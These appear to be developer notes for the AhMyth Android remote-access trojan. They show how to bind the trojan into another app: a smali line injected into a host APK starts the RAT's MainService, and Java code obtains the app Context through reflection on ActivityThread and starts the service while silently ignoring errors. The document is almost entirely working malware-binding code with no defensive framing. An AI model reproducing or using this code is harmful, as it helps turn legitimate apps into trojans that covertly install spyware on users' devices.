

## New Hook Method
```smali

invoke-static, {} Lcom/package/ID/ahmyth/MainService;->start()V
```
## New hopeful Hook start function for `MainService`
```java

private static void findContext() throws Exception {

        Class<?> activityThreadClass;

        try {

            activityThreadClass = Class.forName("android.app.ActivityThread");

        } catch (ClassNotFoundException e) {

            // No context

            return;

        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");

        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {

            // Post to the UI/Main thread and try and retrieve the Context

            final Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                public void run() {

                    try {

                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);

                        if (context != null) {

                            startService(context);

                        }

                    } catch (Exception ignored) {

                    }

                }

            });

        } else {

            startService(context);

        }

    }

    // Smali hook point

    public static void start() {

        try {

            findContext();

        } catch (Exception ignored) {

        }

    }

```
